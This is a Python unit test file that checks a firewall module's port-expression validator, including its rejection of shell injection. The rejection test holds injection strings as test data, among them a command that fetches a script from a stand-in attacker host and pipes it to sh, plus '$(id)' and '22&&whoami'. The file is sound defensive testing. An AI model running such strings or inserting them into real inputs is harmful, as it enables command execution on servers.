import importlib.util
import pathlib
import sys
import types
import unittest


def _load_com_model_main():
    public_stub = types.ModuleType('public')
    public_stub.dict_obj = dict
    public_stub.fail_v2 = lambda msg: {'status': False, 'msg': msg}
    public_stub.success_v2 = lambda msg: {'status': True, 'msg': msg}
    public_stub.return_message = lambda *args, **kwargs: {'status': args[0] == 0}
    public_stub.to_dict_obj = lambda value: value
    public_stub.WriteLog = lambda *args, **kwargs: None
    public_stub.readFile = lambda *args, **kwargs: ''
    public_stub.is_ipv6 = lambda *args, **kwargs: False
    public_stub.checkIp = lambda *args, **kwargs: True
    public_stub.is_domain = lambda *args, **kwargs: True
    public_stub.lang = lambda text, *args: text.format(*args) if args else text

    firewall_base = types.ModuleType('firewallModelV2.firewallBase')
    firewall_base.Base = object

    iptables_services = types.ModuleType('firewallModelV2.iptablesServices')
    iptables_services.IptablesServices = object

    public_validate = types.ModuleType('public.validate')
    public_validate.Param = object

    sys.modules['public'] = public_stub
    sys.modules['firewallModelV2.firewallBase'] = firewall_base
    sys.modules['firewallModelV2.iptablesServices'] = iptables_services
    sys.modules['public.validate'] = public_validate

    path = pathlib.Path(__file__).resolve().parents[2] / 'class_v2' / 'firewallModelV2' / 'comModel.py'
    spec = importlib.util.spec_from_file_location('firewall_com_model', path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.main


class TestFirewallPortValidation(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.model_cls = _load_com_model_main()
        cls.instance = cls.model_cls.__new__(cls.model_cls)

    def test_accepts_numeric_port_patterns(self):
        self.assertEqual(self.instance.normalize_port_expression('80'), '80')
        self.assertEqual(self.instance.normalize_port_expression('80-82'), '80-82')
        self.assertEqual(self.instance.normalize_port_expression('80, 443,1000-1002'), '80,443,1000-1002')

    def test_rejects_shell_injection_patterns(self):
        self.assertIsNone(self.instance.normalize_port_expression('80;curl http://attacker/sh|sh'))
        self.assertIsNone(self.instance.normalize_port_expression('$(id)'))
        self.assertIsNone(self.instance.normalize_port_expression('22&&whoami'))

    def test_rejects_out_of_range_and_invalid_range(self):
        self.assertIsNone(self.instance.normalize_port_expression('0'))
        self.assertIsNone(self.instance.normalize_port_expression('65536'))
        self.assertIsNone(self.instance.normalize_port_expression('200-100'))


if __name__ == '__main__':
    unittest.main()
